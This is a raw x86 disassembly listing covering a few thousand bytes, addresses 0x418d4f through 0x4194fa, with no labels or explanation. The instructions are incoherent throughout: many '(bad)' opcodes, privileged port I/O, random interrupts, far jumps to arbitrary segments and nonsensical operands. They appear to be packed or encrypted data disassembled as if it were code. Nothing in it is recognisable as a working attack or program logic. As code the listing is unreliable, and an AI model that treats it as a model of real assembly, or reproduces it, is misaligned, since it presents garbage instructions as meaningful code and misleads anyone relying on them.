  418d4f:	loope  0x418cd4
  418d51:	dec    ebx
  418d52:	or     dh,dl
  418d54:	int    0x19
  418d56:	int    0x9d
  418d58:	mov    cl,0xd9
  418d5a:	ins    BYTE PTR es:[edi],dx
  418d5b:	inc    esp
  418d5c:	sbb    BYTE PTR [ebx-0x7f],al
  418d5f:	push   edx
  418d60:	scas   al,BYTE PTR es:[edi]
  418d61:	dec    esp
  418d62:	cdq    
  418d63:	mov    dl,0xb3
  418d65:	retf   
  418d66:	lds    ebp,FWORD PTR [esp+edi*1+0x418ae5f9]
  418d6d:	fdiv   st(7),st
  418d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d70:	es mov bl,0x24
  418d73:	aas    
  418d74:	repz or al,0xf9
  418d77:	push   esi
  418d78:	inc    edi
  418d79:	into   
  418d7a:	call   esi
  418d7c:	stos   DWORD PTR es:[edi],eax
  418d7d:	rcl    bh,0x2a
  418d80:	xchg   esp,eax
  418d81:	ficom  DWORD PTR [eax+0x1bb91c2f]
  418d87:	jl     0x418dbf
  418d89:	aaa    
  418d8a:	sbb    cl,BYTE PTR [ecx-0x6a]
  418d8d:	cmp    eax,0xca944090
  418d92:	clc    
  418d93:	mov    BYTE PTR [ecx-0x1],0x4c
  418d97:	dec    edi
  418d98:	adc    dl,0x97
  418d9b:	xchg   eax,ebx
  418d9d:	sub    ebx,DWORD PTR [edi]
  418d9f:	in     eax,dx
  418da0:	outs   dx,BYTE PTR ds:[esi]
  418da1:	or     cl,BYTE PTR [ebp+0x7daadee1]
  418da7:	push   ds
  418da8:	or     eax,0x11b2386a
  418dad:	fs ret 0xc3c3
  418db1:	cmp    al,BYTE PTR [ecx+edx*1+0x44]
  418db5:	aad    0xc6
  418db7:	leave  
  418db8:	jl     0x418e24
  418dba:	fst    QWORD PTR [ebx]
  418dbc:	dec    ebx
  418dbd:	into   
  418dbe:	add    ecx,DWORD PTR [eax-0xc]
  418dc1:	adc    BYTE PTR [edx],cl
  418dc3:	push   cs
  418dc4:	(bad)  
  418dc5:	out    0x7c,al
  418dc7:	daa    
  418dc8:	xchg   DWORD PTR [edi+0x29],esi
  418dcb:	dec    edx
  418dcc:	lock rcl DWORD PTR [ecx],cl
  418dcf:	mov    edi,0x7b0cb50f
  418dd4:	iret   
  418dd5:	jmp    0x418da9
  418dd7:	dec    edi
  418dd8:	es pop ds
  418dda:	pop    ss
  418ddb:	ret    0x2eb7
  418dde:	pop    ebp
  418ddf:	adc    esi,DWORD PTR [edi+0x21a50a55]
  418de5:	mov    BYTE PTR [edx-0x28e5e342],bh
  418deb:	je     0x418daf
  418ded:	scas   al,BYTE PTR es:[edi]
  418dee:	and    bl,BYTE PTR [ecx+edi*4]
  418df1:	mov    eax,0xf69242f2
  418df6:	out    dx,eax
  418df7:	and    dh,ch
  418df9:	mov    esp,0x3e73a00e
  418dfe:	and    al,0xa8
  418e00:	lea    edx,[ebp-0x27]
  418e03:	add    eax,0xcb4cf8cd
  418e08:	out    dx,eax
  418e09:	pop    esi
  418e0a:	repnz sbb BYTE PTR [esp+eax*4+0x1ec1276c],ch
  418e12:	xchg   edx,eax
  418e13:	jo     0x418e20
  418e15:	(bad)  
  418e16:	pop    ss
  418e17:	enter  0x14d6,0x18
  418e1b:	dec    ebp
  418e1c:	jg     0x418e8a
  418e1e:	dec    edi
  418e1f:	shl    DWORD PTR [edi],0x80
  418e22:	or     BYTE PTR [edx+eax*2+0x5d],dl
  418e26:	repnz add DWORD PTR [edx+ebp*2+0x16],eax
  418e2b:	cmp    ch,cl
  418e2d:	inc    ecx
  418e2e:	push   cs
  418e2f:	mov    ?,WORD PTR [ecx]
  418e31:	cld    
  418e32:	(bad)  
  418e33:	ret    
  418e34:	lahf   
  418e35:	(bad)  
  418e36:	sbb    edx,DWORD PTR cs:[eax+0x18]
  418e3a:	out    0xc,al
  418e3c:	cmp    ebx,DWORD PTR [ebp+0x71]
  418e3f:	mov    ebx,0xd998427b
  418e44:	cmp    eax,0x2edba563
  418e49:	add    edx,DWORD PTR [ebx]
  418e4b:	dec    esi
  418e4c:	cmp    eax,0x8145f1b8
  418e51:	inc    edi
  418e52:	and    al,0xf7
  418e54:	lods   al,BYTE PTR ds:[esi]
  418e55:	mov    bh,0xf6
  418e57:	div    BYTE PTR [ecx-0x78c480b4]
  418e5d:	ja     0x418dec
  418e5f:	in     al,dx
  418e60:	retf   
  418e61:	push   ecx
  418e62:	push   ebx
  418e63:	adc    edx,esp
  418e65:	xchg   edi,eax
  418e66:	mov    ecx,ecx
  418e68:	imul   ebp,DWORD PTR [edi+0x2c],0x2f
  418e6c:	xchg   DWORD PTR [ebx-0x1eeb030e],esp
  418e72:	dec    esp
  418e73:	mov    bl,0xec
  418e75:	pop    esp
  418e76:	adc    eax,0x2cfc7dc5
  418e7b:	cmp    esp,edi
  418e7d:	pop    ebx
  418e7e:	dec    esp
  418e7f:	ins    BYTE PTR es:[edi],dx
  418e80:	mov    edx,0x444c9754
  418e85:	ja     0x418e2a
  418e87:	mov    al,ds:0x494a1b65
  418e8c:	and    al,0xc2
  418e8e:	inc    edi
  418e8f:	or     BYTE PTR [ebp+eax*8+0x21],ch
  418e93:	xor    BYTE PTR [edx+esi*8+0x7f],ch
  418e97:	inc    ebx
  418e98:	sbb    bl,BYTE PTR [edi+ebp*1]
  418e9b:	mov    bh,BYTE PTR [eax-0x60a7c7a3]
  418ea1:	xor    esi,esi
  418ea3:	push   cs
  418ea4:	adc    ebp,0x10
  418ea7:	pop    edx
  418ea8:	adc    DWORD PTR [edx-0x2dcfa3f1],0x346a5ba4
  418eb2:	not    BYTE PTR [ebx+0x68]
  418eb5:	rcr    cl,1
  418eb7:	xor    al,0x15
  418eb9:	lahf   
  418eba:	stos   DWORD PTR es:[edi],eax
  418ebb:	loopne 0x418e63
  418ebd:	mov    bh,0x63
  418ebf:	or     BYTE PTR [edi],ah
  418ec1:	push   eax
  418ec2:	push   0x0
  418ec4:	(bad)  
  418ec5:	adc    BYTE PTR [ebp+0xc5dd82d],ah
  418ecb:	rcl    DWORD PTR [ebx+0x37f8ef95],1
  418ed1:	aaa    
  418ed2:	and    al,0x4d
  418ed4:	inc    esp
  418ed5:	push   ecx
  418ed6:	inc    edx
  418ed7:	retf   
  418ed8:	ret    0xf72a
  418edb:	popf   
  418edc:	jmp    0xac6c874d
  418ee1:	push   ebx
  418ee2:	data16 xor al,0x1e
  418ee5:	jl     0x418f10
  418ee7:	hlt    
  418ee8:	ins    BYTE PTR es:[edi],dx
  418ee9:	or     ah,dl
  418eeb:	pusha  
  418eec:	jae    0x418f4e
  418eee:	push   es
  418eef:	rol    DWORD PTR [esi],0x4d
  418ef2:	sub    bh,BYTE PTR [eax+0x14]
  418ef5:	jnp    0x418f58
  418ef7:	inc    ebx
  418ef8:	inc    eax
  418ef9:	dec    esi
  418efa:	xor    DWORD PTR [ecx-0x78e4ff15],ecx
  418f00:	and    BYTE PTR [edx-0x59],ch
  418f03:	test   BYTE PTR [edx-0x4d7e66c9],bh
  418f09:	jmp    FWORD PTR [esi]
  418f0b:	pushf  
  418f0c:	dec    ebx
  418f0d:	addr16 pop ecx
  418f0f:	mov    BYTE PTR [edi+0x7c],cl
  418f12:	push   cs
  418f13:	int    0xdf
  418f15:	ins    BYTE PTR es:[edi],dx
  418f16:	push   ebp
  418f17:	cmp    al,0x34
  418f19:	xchg   edi,eax
  418f1a:	out    0xe0,eax
  418f1c:	sti    
  418f1d:	adc    eax,0x2726ca7
  418f22:	call   0xe26b:0xec89a0f
  418f29:	ins    DWORD PTR es:[edi],dx
  418f2a:	inc    eax
  418f2b:	shl    DWORD PTR [ebx+0x36],0x4f
  418f2f:	imul   bx,bp,0xfff4
  418f33:	push   edi
  418f34:	mov    edi,0xfb91a176
  418f39:	and    DWORD PTR [ecx-0x3d],ecx
  418f3c:	imul   ebx,esp,0x7c706803
  418f42:	imul   esp,DWORD PTR [eax-0x38],0x22
  418f46:	xlat   BYTE PTR ds:[ebx]
  418f47:	and    ebx,DWORD PTR [ecx+0x7b64bc29]
  418f4d:	sub    ecx,DWORD PTR [ecx-0x1580168b]
  418f53:	inc    ebx
  418f54:	jl     0x418f32
  418f56:	mov    DWORD PTR [ebp+0x77],ecx
  418f59:	loop   0x418fa7
  418f5b:	stos   DWORD PTR es:[edi],eax
  418f5c:	retf   
  418f5d:	cmp    DWORD PTR ds:0x4160196,ebp
  418f63:	jae    0x418f2e
  418f65:	popa   
  418f66:	lea    eax,[eax+eiz*1+0x905a115]
  418f6d:	fdivr  DWORD PTR [eax]
  418f6f:	mov    ch,0x57
  418f71:	rcr    edx,cl
  418f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f74:	push   edx
  418f75:	pop    ebx
  418f76:	ss pop ss
  418f78:	imul   edi,DWORD PTR [edi-0x6f38ff],0x52
  418f7f:	adc    ebx,DWORD PTR cs:[edi+0x20ba4c37]
  418f86:	test   eax,0x2c6a47a0
  418f8b:	hlt    
  418f8c:	cmp    eax,DWORD PTR [eax-0x21a3c5ad]
  418f92:	je     0x418f2a
  418f94:	rcl    dl,1
  418f96:	outs   dx,DWORD PTR ds:[esi]
  418f97:	add    DWORD PTR [esi+0x49085b20],ebx
  418f9d:	sbb    ah,0xae
  418fa0:	nop
  418fa1:	arpl   ax,di
  418fa3:	fadd   st(3),st
  418fa5:	sbb    eax,0x81f96fdb
  418faa:	es sbb edx,esp
  418fad:	das    
  418fae:	jmp    0x2adb9112
  418fb3:	imul   ebp,DWORD PTR [edi-0x61],0x35b66b62
  418fba:	push   edi
  418fbb:	outs   dx,DWORD PTR ds:[esi]
  418fbc:	or     bl,ah
  418fbe:	mov    esi,0x9dcb147b
  418fc3:	mov    bh,BYTE PTR [ebx]
  418fc5:	fwait
  418fc6:	adc    ebx,esp
  418fc8:	fisubr DWORD PTR [ebp-0x103ff021]
  418fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fcf:	or     cl,BYTE PTR [edi-0x5079b7ff]
  418fd5:	mov    WORD PTR [esi-0x1b],ss
  418fd8:	push   ecx
  418fd9:	cwde   
  418fda:	stos   DWORD PTR es:[edi],eax
  418fdb:	aam    0x59
  418fdd:	jno    0x419014
  418fdf:	popf   
  418fe0:	and    eax,0xe5c6eea3
  418fe5:	in     eax,0x9c
  418fe7:	adc    DWORD PTR [ecx],0xffffff95
  418fea:	ret    
  418feb:	(bad)  
  418fec:	xchg   ecx,eax
  418fed:	shr    al,1
  418fef:	fdiv   st(7),st
  418ff1:	xlat   BYTE PTR ds:[ebx]
  418ff2:	(bad)  
  418ff3:	cmp    cl,BYTE PTR [eax]
  418ff5:	push   es
  418ff6:	inc    ebp
  418ff7:	pop    edx
  418ff8:	(bad)  
  418ff9:	pusha  
  418ffa:	inc    ecx
  418ffb:	add    al,0x4a
  418ffd:	loop   0x418f87
  418fff:	fdivr  st(7),st
  419001:	jno    0x419057
  419003:	nop
  419004:	ffreep st(5)
  419006:	inc    esi
  419007:	pop    edi
  419008:	retf   
  419009:	xor    edx,DWORD PTR [esi]
  41900b:	inc    edi
  41900c:	or     al,0xad
  41900e:	pop    es
  41900f:	and    bh,BYTE PTR [ebx-0x7a]
  419012:	or     eax,esi
  419014:	inc    esi
  419015:	dec    ebx
  419016:	stos   BYTE PTR es:[edi],al
  419017:	cdq    
  419018:	mov    ecx,0x3832fc7a
  41901d:	outs   dx,BYTE PTR ds:[esi]
  41901e:	sub    DWORD PTR [eax+edi*2-0x4f],eax
  419022:	adc    cl,BYTE PTR [eax+0x5d9cf0f9]
  419028:	jp     0x418ff4
  41902a:	dec    BYTE PTR [ebx+0x2ced2d83]
  419030:	pop    eax
  419031:	fistp  WORD PTR ds:0xd19edb07
  419037:	dec    eax
  419038:	je     0x419041
  41903a:	jne    0x4190a4
  41903c:	out    0xa6,eax
  41903e:	outs   dx,BYTE PTR ds:[esi]
  41903f:	aad    0xf2
  419041:	call   0x1b69045
  419046:	push   edi
  419047:	popa   
  419048:	into   
  419049:	mov    al,0x8c
  41904b:	xchg   BYTE PTR [edi+0x50],dh
  41904e:	cmp    esp,ecx
  419050:	inc    eax
  419051:	mov    esp,0x2b2fc10c
  419056:	aas    
  419057:	out    dx,eax
  419058:	inc    esp
  419059:	pop    edi
  41905a:	jecxz  0x419018
  41905c:	add    ah,BYTE PTR [ebp-0x4e]
  41905f:	adc    BYTE PTR [edx-0x24bae253],cl
  419065:	cld    
  419066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419067:	in     al,0xcb
  419069:	in     al,0x5b
  41906b:	jg     0x419051
  41906d:	fadd   DWORD PTR [ecx+0x600640ec]
  419073:	push   ecx
  419074:	mov    al,0xf8
  419076:	mov    ds:0x60ca27fa,al
  41907b:	test   eax,0xacbb782a
  419080:	xchg   esp,eax
  419081:	punpckhwd mm4,mm1
  419084:	lahf   
  419085:	(bad)  
  419087:	gs inc esi
  419089:	cmc    
  41908a:	or     DWORD PTR [ebx+edx*8+0x65],ebp
  41908e:	pop    esi
  41908f:	lahf   
  419090:	xchg   ebx,eax
  419091:	adc    eax,DWORD PTR [ecx-0x594bcded]
  419097:	int    0x47
  419099:	and    esi,DWORD PTR [edi-0x4e]
  41909c:	ret    
  41909d:	push   edi
  41909e:	adc    ah,BYTE PTR [edi]
  4190a0:	xchg   ebx,eax
  4190a1:	imul   ebx,eax,0x18
  4190a4:	xor    DWORD PTR [ecx+0x3b],edi
  4190a7:	test   eax,0xc418381b
  4190ac:	push   eax
  4190ad:	and    al,0x82
  4190af:	adc    BYTE PTR [esi+0x2a],cl
  4190b2:	addr16 cmp al,0x49
  4190b5:	sbb    bl,BYTE PTR [esi+edx*4]
  4190b8:	into   
  4190b9:	out    0x39,eax
  4190bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190bc:	inc    ebp
  4190bd:	leave  
  4190be:	add    al,0x8c
  4190c0:	popa   
  4190c1:	mov    edx,0xdd33c879
  4190c6:	inc    esi
  4190c7:	rcl    BYTE PTR [esi+0x6b],1
  4190ca:	and    BYTE PTR [ebp-0x55],bh
  4190cd:	sub    BYTE PTR [eax],0x83
  4190d0:	sub    ebp,edi
  4190d2:	xchg   ebx,eax
  4190d3:	das    
  4190d4:	sbb    esp,DWORD PTR [edx+0x770a1d38]
  4190da:	fsub   st,st(1)
  4190dc:	shl    edi,cl
  4190de:	mov    edi,0x66811d79
  4190e3:	jbe    0x4190f9
  4190e5:	mov    bl,0xb0
  4190e7:	rcl    DWORD PTR [ecx+0x52],cl
  4190ea:	push   0xdcda8cdd
  4190ef:	out    dx,eax
  4190f0:	repz mov ebx,0x75fbd452
  4190f6:	popf   
  4190f7:	loopne 0x419125
  4190f9:	fisubr WORD PTR [edx+0x47]
  4190fc:	ins    DWORD PTR es:[edi],dx
  4190fd:	adc    edx,DWORD PTR [ebp-0xe]
  419100:	and    cl,BYTE PTR [ebx+0x23]
  419103:	sbb    bl,BYTE PTR ds:0x937c1ece
  419109:	cmp    dl,dh
  41910b:	xchg   esi,eax
  41910c:	sar    ch,0x8e
  41910f:	adc    edx,ebx
  419111:	pop    es
  419112:	mov    eax,0xf50448c3
  419117:	jo     0x419150
  419119:	mov    edx,DWORD PTR [eax+0x7a]
  41911c:	xchg   ecx,eax
  41911d:	test   BYTE PTR [esi+0x5721bf32],0x5a
  419124:	clc    
  419125:	fsub   QWORD PTR [eax]
  419127:	test   al,0x74
  419129:	outs   dx,DWORD PTR ds:[esi]
  41912a:	push   0x2a
  41912c:	dec    ebx
  41912d:	(bad)  
  41912e:	mov    ecx,0xed1300eb
  419133:	les    edx,FWORD PTR ds:0x4aac592d
  419139:	retf   0xfd64
  41913c:	mov    bl,0xec
  41913e:	pop    ss
  41913f:	rcl    cl,1
  419141:	jecxz  0x419136
  419143:	outs   dx,BYTE PTR ds:[esi]
  419144:	sub    DWORD PTR ds:0x50a932a2,esi
  41914a:	arpl   WORD PTR [edi-0x67],dx
  41914d:	or     cl,dh
  41914f:	nop
  419150:	sbb    DWORD PTR [esi-0x59670e29],eax
  419156:	repz xor bl,BYTE PTR [ebx]
  419159:	outs   dx,DWORD PTR ds:[esi]
  41915a:	fbld   TBYTE PTR ds:0x51121e61
  419160:	add    DWORD PTR [ecx+0xef1f46a],ebx
  419166:	sub    al,bl
  419168:	jne    0x41911d
  41916a:	jmp    0x8e74:0xdcdf5fd0
  419171:	adc    al,0x33
  419173:	es pop ss
  419175:	fldcw  WORD PTR [ecx]
  419177:	sbb    edi,eax
  419179:	imul   edx,DWORD PTR [esi+esi*1-0x52853fe5],0x15
  419181:	xor    BYTE PTR [eax+0x44],cl
  419184:	cwde   
  419185:	sub    BYTE PTR [edx-0x20],ch
  419188:	mov    al,ch
  41918a:	fstp   TBYTE PTR ds:0xdeda6f17
  419190:	pop    ss
  419191:	cmp    esp,esi
  419193:	adc    dl,al
  419195:	push   ss
  419196:	fwait
  419197:	dec    edi
  419198:	push   esi
  419199:	ins    BYTE PTR es:[edi],dx
  41919a:	pop    ebx
  41919b:	aam    0xc7
  41919d:	push   edx
  41919e:	add    eax,esp
  4191a0:	adc    DWORD PTR [edi],ecx
  4191a2:	or     al,0xd5
  4191a4:	aad    0xd4
  4191a6:	dec    ebx
  4191a7:	jmp    0xc3ae:0x86bec995
  4191ae:	mov    eax,0x4164a84c
  4191b3:	and    ebp,esi
  4191b5:	imul   eax,DWORD PTR [ecx+0x4230bd3c],0x330112ca
  4191bf:	sahf   
  4191c0:	bound  ebp,QWORD PTR [eax+0x18]
  4191c3:	cwde   
  4191c4:	xor    al,bh
  4191c6:	fsubr  st(1),st
  4191c8:	(bad)  
  4191c9:	mov    ebx,0x86e939f6
  4191ce:	imul   ecx,DWORD PTR [ecx+0x44ace20d],0xffffffbe
  4191d5:	(bad)  
  4191d6:	mov    ebp,0x6b35c2f1
  4191db:	test   eax,0xbe2befdc
  4191e0:	(bad)  
  4191e1:	push   eax
  4191e2:	fist   WORD PTR ds:0xe50c0c05
  4191e8:	es ret 
  4191ea:	pop    edi
  4191eb:	ins    BYTE PTR es:[edi],dx
  4191ec:	shl    DWORD PTR [edi+0x125b3558],1
  4191f2:	jmp    0x4191be
  4191f4:	mov    dh,0x2f
  4191f6:	pop    esi
  4191f7:	in     al,0xb0
  4191f9:	mov    ecx,0xdf981d94
  4191fe:	outs   dx,BYTE PTR ds:[esi]
  4191ff:	sub    DWORD PTR [edx-0x720d5018],0x61060ada
  419209:	push   es
  41920a:	ins    DWORD PTR es:[edi],dx
  41920b:	fnstsw WORD PTR [eax-0x26]
  41920e:	dec    esp
  41920f:	and    DWORD PTR [edx+ecx*4-0x4e07651c],edi
  419216:	sbb    BYTE PTR [ebx+eiz*4],dh
  419219:	sub    DWORD PTR [esi+0x1f],esp
  41921c:	imul   edx,DWORD PTR ds:0x53035249,0xca12c0c4
  419226:	stos   BYTE PTR es:[edi],al
  419227:	aam    0x4f
  419229:	repz sub BYTE PTR [esi],bh
  41922c:	adc    ecx,DWORD PTR [edi]
  41922e:	sar    BYTE PTR [edi+eiz*1+0x47],0x71
  419233:	mov    ?,edi
  419235:	(bad)  
  419236:	hlt    
  419237:	nop
  419238:	sub    eax,0x809c29a0
  41923d:	mov    ecx,0x4b97bcbc
  419242:	adc    al,0x94
  419244:	xor    edi,DWORD PTR [eax-0x4b1b2016]
  41924a:	out    dx,al
  41924b:	dec    edx
  41924c:	jno    0x419262
  41924e:	lock dec esi
  419250:	jecxz  0x419240
  419252:	fild   DWORD PTR [edx+0x3a]
  419255:	(bad)  
  419256:	fadd   DWORD PTR [ebx+ebx*4+0x35d83c9c]
  41925d:	pop    edi
  41925e:	sbb    bl,BYTE PTR [edx+0x59340d76]
  419264:	or     ch,BYTE PTR [ecx-0x62ee5041]
  41926a:	scas   eax,DWORD PTR es:[edi]
  41926b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926c:	mov    esi,0xcaa42f4b
  419271:	shr    DWORD PTR [edi],0xd3
  419274:	mov    esi,0xff811b91
  419279:	daa    
  41927a:	cmc    
  41927b:	neg    BYTE PTR [ebp+0x6175d4da]
  419281:	cmp    BYTE PTR [esi-0x67205da8],cl
  419287:	push   ebx
  419288:	jns    0x419245
  41928a:	xor    DWORD PTR [eax+0x6b],ebx
  41928d:	mov    edx,0x513ba122
  419292:	fnsave [edx-0x24]
  419295:	mov    al,0x41
  419297:	mov    ecx,0xe6fab6c1
  41929c:	push   ss
  41929d:	int3   
  41929e:	loop   0x4192c2
  4192a0:	inc    ebx
  4192a1:	pop    edi
  4192a2:	push   DWORD PTR [esi]
  4192a4:	mov    dl,0x84
  4192a6:	add    ah,dl
  4192a8:	jge    0x4192b7
  4192aa:	(bad)  
  4192ab:	jne    0x419292
  4192ad:	fcom   DWORD PTR [esi-0x1]
  4192b0:	mov    cl,0x7a
  4192b2:	pushf  
  4192b3:	cld    
  4192b4:	xchg   ch,bl
  4192b6:	into   
  4192b7:	or     DWORD PTR [ebx-0x19a4943c],ebx
  4192bd:	daa    
  4192be:	(bad)
  4192c2:	mov    esp,0x8697dfed
  4192c7:	(bad)  
  4192c8:	pop    eax
  4192c9:	mov    ds:0x1f923886,eax
  4192ce:	push   0x12
  4192d0:	outs   dx,DWORD PTR ds:[esi]
  4192d1:	ins    BYTE PTR es:[edi],dx
  4192d2:	cmp    bh,BYTE PTR [ecx]
  4192d4:	inc    edi
  4192d5:	add    BYTE PTR [ebp+0x72],ah
  4192d8:	(bad)  
  4192d9:	(bad)  
  4192da:	lock inc esp
  4192dc:	inc    ebx
  4192dd:	in     eax,dx
  4192de:	fiadd  DWORD PTR [edx]
  4192e0:	ds (bad) 
  4192e2:	or     al,0xca
  4192e4:	inc    ebp
  4192e5:	mov    esi,0xb68fe0d3
  4192ea:	push   esi
  4192eb:	and    eax,0xf409c029
  4192f0:	das    
  4192f1:	int    0x42
  4192f3:	repz adc DWORD PTR [edx],eax
  4192f6:	pop    eax
  4192f7:	int    0x40
  4192f9:	pop    edx
  4192fa:	push   es
  4192fb:	or     BYTE PTR [edx-0x7b],bh
  4192fe:	sub    DWORD PTR [ecx+0x5bd058ce],esi
  419304:	dec    eax
  419305:	add    esi,DWORD PTR [esi]
  419307:	adc    al,0xeb
  419309:	sahf   
  41930a:	or     eax,DWORD PTR [edx+0x34]
  41930d:	fs dec ecx
  41930f:	pop    esp
  419310:	pop    es
  419311:	dec    edx
  419312:	js     0x41937a
  419314:	fisttp QWORD PTR [edx-0x4d348b4b]
  41931a:	jge    0x41932c
  41931c:	xor    eax,0x5eae9bce
  419321:	enter  0xce98,0xaf
  419325:	sbb    al,0x29
  419327:	out    0xd3,al
  419329:	aas    
  41932a:	test   eax,0x3dba2941
  41932f:	sar    bh,cl
  419331:	icebp  
  419332:	xchg   DWORD PTR [eax-0x383ba3cd],ebp
  419338:	sub    esp,DWORD PTR [ecx]
  41933a:	push   es
  41933b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41933c:	test   al,0x1e
  41933e:	add    eax,0xa827f67a
  419343:	xor    edi,edi
  419345:	loop   0x4193b9
  419347:	push   edi
  419348:	fsub   DWORD PTR [edx+0x6e5dd5ce]
  41934e:	mov    dl,0x73
  419350:	out    0xf2,eax
  419352:	fbld   TBYTE PTR [edx+0x44ed3cd6]
  419358:	icebp  
  419359:	adc    edx,DWORD PTR [ebx+0x3b]
  41935c:	retf   
  41935d:	popa   
  41935e:	pop    ds
  41935f:	push   ds
  419360:	je     0x4193a2
  419362:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419364:	cmp    ah,BYTE PTR [edi+0x9]
  419367:	add    edx,DWORD PTR [eax+ecx*1]
  41936a:	dec    esp
  41936b:	test   eax,0xe50b450f
  419370:	mov    esi,0x35154365
  419375:	outs   dx,BYTE PTR ds:[esi]
  419376:	imul   ebp,DWORD PTR [edx+0x39737c64],0x438f2038
  419380:	push   ebx
  419381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419382:	and    ah,BYTE PTR [esi+edx*8+0x63]
  419386:	xchg   esi,eax
  419387:	loopne 0x419329
  419389:	mov    ah,0xaa
  41938b:	xor    ah,al
  41938d:	jge    0x41933f
  41938f:	cs jmp 0x3280:0xb2a0f6f0
  419397:	ins    DWORD PTR es:[edi],dx
  419398:	out    0xaa,al
  41939a:	jno    0x4193ca
  41939c:	mov    eax,eax
  41939e:	mov    dl,0xbb
  4193a0:	fadd   st,st(3)
  4193a2:	xchg   ecx,eax
  4193a3:	sub    DWORD PTR [edi+0x46a998a0],ecx
  4193a9:	lods   eax,DWORD PTR ds:[esi]
  4193aa:	sub    eax,0xd837fb2b
  4193af:	lahf   
  4193b0:	mov    ah,0x77
  4193b2:	lds    esi,FWORD PTR [eax+0x329d6e82]
  4193b8:	sub    DWORD PTR [eax+0x250d7c1e],eax
  4193be:	out    dx,eax
  4193bf:	jmp    DWORD PTR [eax-0x69a75534]
  4193c5:	(bad)  
  4193c6:	mov    edx,0x3f929541
  4193cb:	ret    
  4193cc:	sti    
  4193cd:	test   DWORD PTR [ecx+0x2c],ecx
  4193d0:	jmp    0x4193b1
  4193d2:	push   edi
  4193d3:	(bad)  
  4193d4:	push   ebx
  4193d5:	call   0xbf35:0x83d6a12e
  4193dc:	das    
  4193dd:	mov    DWORD PTR [edi+0x16],ebp
  4193e0:	iret   
  4193e1:	lea    edx,[esi]
  4193e3:	jo     0x41938f
  4193e5:	stc    
  4193e6:	lods   al,BYTE PTR ds:[esi]
  4193e7:	mov    edi,edx
  4193e9:	jecxz  0x41940d
  4193eb:	loope  0x41944f
  4193ed:	sub    eax,edx
  4193ef:	iret   
  4193f0:	sub    BYTE PTR [edx-0x7741146],dh
  4193f6:	pushf  
  4193f7:	int3   
  4193f8:	sub    DWORD PTR [ecx+eax*4+0x5a7818ad],esi
  4193ff:	(bad)  
  419400:	fild   WORD PTR [edi+edx*2+0x38]
  419404:	push   0x515ec35c
  419409:	jecxz  0x419447
  41940b:	pop    eax
  41940c:	or     DWORD PTR [esi],eax
  41940e:	stos   DWORD PTR es:[edi],eax
  41940f:	icebp  
  419410:	xchg   edx,eax
  419411:	jmp    0xb9d6:0x742f9c13
  419418:	iret   
  419419:	daa    
  41941a:	(bad)  
  41941b:	sub    ebp,DWORD PTR [eax-0x11]
  41941e:	(bad)  
  41941f:	aam    0xa2
  419421:	dec    DWORD PTR [ecx]
  419423:	popf   
  419424:	pop    edx
  419425:	cs icebp 
  419427:	shl    DWORD PTR [edi+esi*2-0x6],0xec
  41942c:	gs xor eax,0xb995dfb2
  419432:	add    BYTE PTR [edx+eiz*1-0x47cb9c8],bl
  419439:	xchg   edi,eax
  41943a:	fist   WORD PTR [esi-0x40]
  41943d:	out    dx,al
  41943e:	adc    esi,DWORD PTR [edi-0x17e25940]
  419444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419445:	cwde   
  419446:	jne    0x419419
  419448:	sbb    eax,0xf110d28a
  41944d:	xchg   esi,eax
  41944e:	cmp    al,0x53
  419450:	ss inc edi
  419452:	add    esp,DWORD PTR [ebx-0x21]
  419455:	inc    ebx
  419456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419457:	push   ecx
  419458:	or     bh,bl
  41945a:	and    cl,cl
  41945c:	inc    ebp
  41945d:	inc    ebx
  41945e:	or     al,0xd5
  419460:	fnsave [edi+0x6e3d9f2d]
  419466:	jge    0x4194cc
  419468:	nop
  419469:	into   
  41946a:	(bad)  
  41946c:	sub    eax,0xbf729ba0
  419471:	jns    0x4194be
  419473:	push   edx
  419474:	mov    edi,0x5d4de832
  419479:	leave  
  41947a:	mov    eax,0xa7f5e98d
  41947f:	sub    ah,BYTE PTR [eax+eiz*1+0x51bd36c9]
  419486:	xor    BYTE PTR [esi],dh
  419488:	jge    0x41940b
  41948a:	das    
  41948b:	cmp    al,0x84
  41948d:	adc    ebp,esp
  41948f:	scas   eax,DWORD PTR es:[edi]
  419490:	adc    edx,edi
  419492:	cli    
  419493:	adc    ah,BYTE PTR [esi-0x5d9e6875]
  419499:	pushf  
  41949a:	mov    dl,0x79
  41949c:	dec    edi
  41949d:	fistp  WORD PTR [edx]
  41949f:	push   esi
  4194a0:	mov    ds:0x4ec449a0,al
  4194a5:	jnp    0x4194ed
  4194a7:	loope  0x419486
  4194a9:	int3   
  4194aa:	cld    
  4194ab:	push   cs
  4194ac:	and    BYTE PTR [ebx],bh
  4194ae:	mov    edi,0xade89824
  4194b3:	nop
  4194b4:	dec    ecx
  4194b5:	mov    DWORD PTR [ecx+eax*1],ebp
  4194b8:	repnz lods al,BYTE PTR ds:[esi]
  4194ba:	jecxz  0x4194bf
  4194bc:	push   ebx
  4194bd:	inc    ebx
  4194be:	int    0x2b
  4194c0:	xchg   esi,eax
  4194c1:	mov    bl,0x52
  4194c3:	sub    eax,0x10c75cbb
  4194c8:	push   ss
  4194c9:	pop    edi
  4194ca:	mov    al,ds:0x39b58daa
  4194cf:	xor    eax,0x445cb13b
  4194d4:	pop    ebp
  4194d5:	ins    BYTE PTR es:[edi],dx
  4194d6:	inc    ecx
  4194d7:	repnz pop esi
  4194d9:	sub    ecx,eax
  4194db:	adc    ax,0x2455
  4194df:	retf   0x25e7
  4194e2:	or     eax,0xfb673408
  4194e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e8:	fs cmp esi,0x76
  4194ec:	std    
  4194ed:	ins    BYTE PTR es:[edi],dx
  4194ee:	in     eax,0x98
  4194f0:	int3   
  4194f1:	loopne 0x419500
  4194f3:	mov    ebx,DWORD PTR [ebx+0x17d1f202]
  4194f9:	stos   DWORD PTR es:[edi],eax
  4194fa:	add    eax,0x82e325a6
